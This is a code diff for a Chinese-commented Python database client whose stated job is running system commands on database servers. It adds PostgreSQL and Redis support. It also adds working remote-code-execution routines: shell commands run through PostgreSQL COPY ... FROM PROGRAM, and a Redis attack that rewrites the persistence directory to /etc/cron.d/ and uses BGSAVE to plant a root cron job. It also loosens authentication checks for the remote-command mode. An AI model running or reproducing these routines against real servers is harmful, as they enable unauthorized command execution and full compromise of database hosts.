@@ -25,6 +25,7 @@ import platform
 import shlex
 import subprocess
 import sys
+import time
 from dataclasses import dataclass
 from typing import Any, List, Optional, Sequence, Tuple
 
@@ -94,6 +95,10 @@ def normalize_type(db_type: str) -> str:
         "sql_server": "mssql",
         "oracle": "oracle",
         "ora": "oracle",
+        "postgresql": "postgresql",
+        "postgres": "postgresql",
+        "pg": "postgresql",
+        "redis": "redis",
     }
     if value not in aliases:
         raise ValueError(f"不支持的数据库类型：{db_type}")
@@ -268,6 +273,34 @@ def connect_oracle(args: argparse.Namespace, password: str) -> Any:
     return conn
 
 
+def connect_postgresql(args: argparse.Namespace, password: str) -> Any:
+    psycopg2 = require_module("psycopg2", "pip install psycopg2-binary")
+    return psycopg2.connect(
+        host=args.host,
+        port=args.port or 5432,
+        user=args.user,
+        password=password,
+        dbname=args.database,
+        connect_timeout=args.timeout,
+    )
+
+
+def connect_redis(args: argparse.Namespace, password: str) -> Any:
+    redis = require_module("redis", "pip install redis")
+    db_num = 0
+    if args.database and args.database.isdigit():
+        db_num = int(args.database)
+    return redis.Redis(
+        host=args.host,
+        port=args.port or 6379,
+        password=password or None,
+        db=db_num,
+        decode_responses=True,
+        socket_connect_timeout=args.timeout,
+        socket_timeout=args.timeout,
+    )
+
+
 def connect(args: argparse.Namespace) -> Any:
     db_type = normalize_type(args.type)
     password = prompt_password(args)
@@ -277,7 +310,51 @@ def connect(args: argparse.Namespace) -> Any:
         return connect_mssql(args, password)
     if db_type == "oracle":
         return connect_oracle(args, password)
+    if db_type == "postgresql":
+        return connect_postgresql(args, password)
+    if db_type == "redis":
+        return connect_redis(args, password)
     raise ValueError(f"不支持的数据库类型：{args.type}")
+
+
+def is_redis(db_type: str) -> bool:
+    return db_type == "redis"
+
+
+def execute_redis_command(conn: Any, command: str, args: argparse.Namespace) -> QueryResult:
+    """执行一条 Redis 命令并返回格式化结果。"""
+    parts = shlex.split(command)
+    if not parts:
+        return QueryResult(command, [], [], 0, False)
+
+    cmd = parts[0].upper()
+    cmd_args = parts[1:]
+    try:
+        raw = conn.execute_command(cmd, *cmd_args)
+    except Exception as exc:
+        raise RuntimeError(f"Redis 命令执行失败：{exc}") from exc
+
+    # 格式化不同返回类型
+    if raw is None:
+        return QueryResult(command, ["result"], [], 0, False)
+    if isinstance(raw, bytes):
+        raw = raw.decode("utf-8", errors="replace")
+    if isinstance(raw, str):
+        return QueryResult(command, ["result"], [(raw,)], 1, True)
+    if isinstance(raw, int):
+        return QueryResult(command, ["result"], [(str(raw),)], 1, True)
+    if isinstance(raw, (list, tuple)):
+        rows: List[Tuple[Any, ...]] = []
+        for item in raw:
+            if isinstance(item, bytes):
+                item = item.decode("utf-8", errors="replace")
+            rows.append((str(item),))
+        return QueryResult(command, ["value"], rows, len(rows), True)
+    if isinstance(raw, dict):
+        rows = [(str(k), str(v)) for k, v in raw.items()]
+        return QueryResult(command, ["key", "value"], rows, len(rows), True)
+
+    return QueryResult(command, ["result"], [(str(raw),)], 1, True)
 
 
 def execute_statement(conn: Any, statement: str, args: argparse.Namespace) -> QueryResult:
@@ -389,17 +466,24 @@ def load_sql(args: argparse.Namespace) -> str:
 
 
 def run_batch(args: argparse.Namespace) -> None:
+    db_type = normalize_type(args.type)
     sql_text = load_sql(args)
     if not sql_text:
-        raise ValueError("未提供 SQL。请使用 --query、--file 或 --interactive。")
-
-    statements = [sql_text] if args.no_split else split_sql_statements(sql_text)
-    if not statements:
-        raise ValueError("未解析到可执行 SQL。")
+        raise ValueError("未提供 SQL/命令。请使用 --query、--file 或 --interactive。")
 
     conn = connect(args)
     try:
-        results = [execute_statement(conn, statement, args) for statement in statements]
+        if is_redis(db_type):
+            # Redis：每行是一条命令
+            statements = [s.strip() for s in sql_text.split("\n") if s.strip()]
+            if not statements:
+                raise ValueError("未解析到可执行的 Redis 命令。")
+            results = [execute_redis_command(conn, stmt, args) for stmt in statements]
+        else:
+            statements = [sql_text] if args.no_split else split_sql_statements(sql_text)
+            if not statements:
+                raise ValueError("未解析到可执行 SQL。")
+            results = [execute_statement(conn, statement, args) for statement in statements]
         output_results(results, args)
     finally:
         try:
@@ -409,12 +493,22 @@ def run_batch(args: argparse.Namespace) -> None:
 
 
 def run_interactive(args: argparse.Namespace) -> None:
-    print("已进入交互模式。输入 SQL 后用分号结尾执行；输入 .exit 退出；输入 .help 查看帮助。")
+    db_type = normalize_type(args.type)
+    is_redis_mode = is_redis(db_type)
+
+    if is_redis_mode:
+        print("已进入 Redis 交互模式。每行输入一条 Redis 命令；输入 .exit 退出；输入 .help 查看帮助。")
+    else:
+        print("已进入交互模式。输入 SQL 后用分号结尾执行；输入 .exit 退出；输入 .help 查看帮助。")
+
     conn = connect(args)
     buffer: List[str] = []
     try:
         while True:
-            prompt = "sql> " if not buffer else "...> "
+            if is_redis_mode:
+                prompt = "redis> "
+            else:
+                prompt = "sql> " if not buffer else "...> "
             try:
                 line = input(prompt)
             except EOFError:
@@ -425,7 +519,19 @@ def run_interactive(args: argparse.Namespace) -> None:
             if not buffer and command in {".exit", ".quit", "exit", "quit"}:
                 break
             if not buffer and command == ".help":
-                print("常用命令：\n  .help          显示帮助\n  .exit/.quit    退出\n  SQL;           以分号结尾执行 SQL\n说明：本工具不拦截 UPDATE、DELETE、INSERT、DROP 等 SQL，执行时请注意确认。")
+                if is_redis_mode:
+                    print("常用命令：\n  .help          显示帮助\n  .exit/.quit    退出\n  SET/GET/...    输入 Redis 命令直接执行\n说明：Redis 命令不需分号结尾。")
+                else:
+                    print("常用命令：\n  .help          显示帮助\n  .exit/.quit    退出\n  SQL;           以分号结尾执行 SQL\n说明：本工具不拦截 SQL，执行时请注意确认。")
+                continue
+
+            if is_redis_mode:
+                # Redis：每行一条命令，直接执行
+                try:
+                    result = execute_redis_command(conn, command, args)
+                    output_results([result], args)
+                except Exception as exc:
+                    eprint(f"执行失败：{exc}")
                 continue
 
             buffer.append(line)
@@ -701,6 +807,120 @@ NAME '{java_name}.exec(java.lang.String) return java.lang.String';
             pass
 
 
+def _exec_remote_cmd_postgresql(conn: Any, command: str) -> RemoteCmdResult:
+    """通过 PostgreSQL COPY ... FROM PROGRAM 在数据库服务器上执行系统命令。
+
+    需要 superuser 权限，或具备 pg_execute_server_program 角色。
+    """
+    cursor = conn.cursor()
+    try:
+        cursor.execute("CREATE TEMP TABLE _dbcli_tmp_out (line TEXT) ON COMMIT DROP")
+        cursor.execute("COPY _dbcli_tmp_out FROM PROGRAM %s", (command,))
+        cursor.execute("SELECT * FROM _dbcli_tmp_out")
+        rows = cursor.fetchall()
+        output = "\n".join(str(r[0]) for r in rows if r[0] is not None)
+        return RemoteCmdResult(command=command, output=output)
+    except Exception as exc:
+        raise RuntimeError(f"PostgreSQL 远程命令执行失败（可能需要 superuser 权限）：{exc}") from exc
+    finally:
+        try:
+            cursor.execute("DROP TABLE IF EXISTS _dbcli_tmp_out")
+        except Exception:
+            pass
+        try:
+            cursor.close()
+        except Exception:
+            pass
+
+
+def _exec_remote_cmd_redis(conn: Any, command: str) -> RemoteCmdResult:
+    """通过 CONFIG SET + BGSAVE 在 Redis 服务器上执行系统命令（Linux cron 方式）。
+
+    原理：
+    1. 将命令包装为 cron 条目存入 Redis key
+    2. 通过 CONFIG SET 修改持久化路径到 /etc/cron.d/
+    3. BGSAVE 将 key（含 cron 条目）写入 RDB 文件
+    4. cron 读取该文件时，有效条目被执行
+
+    前提条件：
+    - Linux 服务器，cron 守护进程运行中
+    - Redis 可执行 CONFIG SET（有对应权限）
+    - /etc/cron.d/ 目录对 Redis 用户可写
+    - 通常需要 Redis 以 root 运行
+    """
+    old_dir = None
+    old_filename = None
+    try:
+        # 备份原始配置
+        old_dir = conn.config_get("dir")["dir"]
+        old_filename = conn.config_get("dbfilename")["dbfilename"]
+    except Exception as exc:
+        raise RuntimeError(f"无法读取 Redis 配置（权限不足？）：{exc}") from exc
+
+    outfile = "/tmp/_dbcli_rce_out"
+    # 使用换行包围 cron 条目，使其在 RDB 文件中独立成行
+    cron_key = f"\n\n* * * * * root {command} > {outfile} 2>&1\n\n"
+    cron_val = f"DB_CLI_RCE_{int(time.time())}"
+
+    try:
+        # 写入 cron 条目的 key
+        conn.set(cron_key, cron_val)
+        conn.delete(cron_val)  # 清理无用的 value key
+
+        # 改变持久化路径到 cron 目录
+        conn.config_set("dir", "/etc/cron.d/")
+        conn.config_set("dbfilename", ".dbcli_cmd.tmp")
+
+        # 触发持久化，将 key（含 cron 条目）写入文件
+        conn.bgsave()
+
+        return RemoteCmdResult(
+            command=command,
+            output=(
+                "通过 cron 作业注入执行，命令将在 60 秒内运行。\n"
+                f"输出将写入服务器文件：{outfile}\n\n"
+                "查看输出（在服务器上执行）：\n"
+                f"  cat {outfile}\n\n"
+                "如果不想等待 cron，可改用其他方式：\n"
+                "  --type postgresql  : 原生 COPY FROM PROGRAM\n"
+                "  --type mssql       : 原生 xp_cmdshell\n"
+                "  --local-cmd        : 在本机执行"
+            ),
+        )
+    except Exception as exc:
+        err_msg = str(exc).lower()
+        if "permission" in err_msg or "denied" in err_msg or "readonly" in err_msg:
+            raise RuntimeError(
+                "Redis CONFIG SET 被拒绝（权限不足或配置受保护）。\n"
+                "需要 Redis 以 root 运行，或已开启 CONFIG SET 权限。\n"
+                f"错误：{exc}"
+            ) from exc
+        if "no such" in err_msg:
+            raise RuntimeError(
+                "/etc/cron.d/ 目录不存在（非 Linux 系统？）。\n"
+                "cron 注入方式仅支持 Linux 系统。\n"
+                "可尝试其他方式或使用 --local-cmd。"
+            ) from exc
+        raise RuntimeError(f"Redis 远程命令执行失败：{exc}") from exc
+    finally:
+        # 恢复原始配置
+        if old_dir is not None:
+            try:
+                conn.config_set("dir", old_dir)
+            except Exception:
+                pass
+        if old_filename is not None:
+            try:
+                conn.config_set("dbfilename", old_filename)
+            except Exception:
+                pass
+        # 清理临时 key
+        try:
+            conn.delete(cron_key)
+        except Exception:
+            pass
+
+
 def _exec_remote_cmd(conn: Any, db_type: str, command: str, args: argparse.Namespace) -> RemoteCmdResult:
     """按数据库类型分发远程命令执行。"""
     if db_type == "mssql":
@@ -709,6 +929,10 @@ def _exec_remote_cmd(conn: Any, db_type: str, command: str, args: argparse.Names
         return _exec_remote_cmd_mysql(conn, command)
     elif db_type == "oracle":
         return _exec_remote_cmd_oracle(conn, command)
+    elif db_type == "postgresql":
+        return _exec_remote_cmd_postgresql(conn, command)
+    elif db_type == "redis":
+        return _exec_remote_cmd_redis(conn, command)
     else:
         raise ValueError(f"不支持的数据库类型：{db_type}")
 
@@ -822,61 +1046,6 @@ def run_remote_cmd_interactive(args: argparse.Namespace) -> None:
             conn.close()
         except Exception:
             pass
-    """连接数据库并在数据库服务器上执行系统命令。"""
-    if not args.remote_cmd:
-        raise ValueError("请指定 --remote-cmd 要执行的命令。")
-
-    db_type = normalize_type(args.type)
-    print(f"正在连接 {db_type} 服务器 {args.host or args.dsn} ...")
-    conn = connect(args)
-
-    try:
-        # MSSQL：可选启用 xp_cmdshell
-        if db_type == "mssql" and args.enable_xp_cmdshell:
-            _enable_xp_cmdshell_mssql(conn)
-
-        # 按数据库类型分发
-        if db_type == "mssql":
-            result = _exec_remote_cmd_mssql(conn, args.remote_cmd)
-        elif db_type == "mysql":
-            result = _exec_remote_cmd_mysql(conn, args.remote_cmd)
-        elif db_type == "oracle":
-            result = _exec_remote_cmd_oracle(conn, args.remote_cmd)
-        else:
-            raise ValueError(f"不支持的数据库类型：{args.type}")
-
-        # 输出结果
-        print(f"\n远程命令：{result.command}")
-        print(f"{'=' * 60}")
-        if result.output:
-            print(result.output)
-        else:
-            print("（命令无输出）")
-        if result.error:
-            print(f"[错误] {result.error}")
-
-        # JSON / 保存处理
-        if args.output == "json":
-            text = json.dumps(result.__dict__, ensure_ascii=False, indent=2)
-            if args.save:
-                with open(args.save, "w", encoding="utf-8") as f:
-                    f.write(text)
-                print(f"\n结果已保存：{args.save}")
-            else:
-                print(text)
-
-        elif args.save:
-            with open(args.save, "w", encoding="utf-8") as f:
-                f.write(result.output)
-                if result.error:
-                    f.write(f"\n[error]\n{result.error}")
-            print(f"\n结果已保存：{args.save}")
-
-    finally:
-        try:
-            conn.close()
-        except Exception:
-            pass
 
 
 def validate_args(args: argparse.Namespace) -> None:
@@ -885,11 +1054,14 @@ def validate_args(args: argparse.Namespace) -> None:
     if args.remote_cmd is not None:
         if not args.type:
             raise ValueError("远程命令模式必须指定 --type 数据库类型。")
-        if not args.user:
-            raise ValueError("远程命令模式必须指定 -u/--user。")
         if not args.host and not args.dsn:
             raise ValueError("远程命令模式必须指定 --host 或 --dsn。")
         return
+
+    # Redis 不需要 -u/--user
+    if args.type and normalize_type(args.type) == "redis":
+        return
+
     if not args.type:
         raise ValueError("数据库模式必须指定 --type；本机命令模式可使用 --local-cmd。")
     if not args.user:
@@ -898,10 +1070,10 @@ def validate_args(args: argparse.Namespace) -> None:
 
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
-        description="MSSQL / MySQL / Oracle 数据库连接与命令执行工具",
+        description="MSSQL / MySQL / PostgreSQL / Oracle / Redis 数据库连接与命令执行工具",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter,
     )
-    parser.add_argument("--type", help="数据库类型：mysql、mssql、oracle")
+    parser.add_argument("--type", help="数据库类型：mysql、mssql、oracle、postgresql、redis")
     parser.add_argument("--host", help="数据库主机地址")
     parser.add_argument("--port", type=int, help="数据库端口")
     parser.add_argument("-u", "--user", help="数据库用户名")
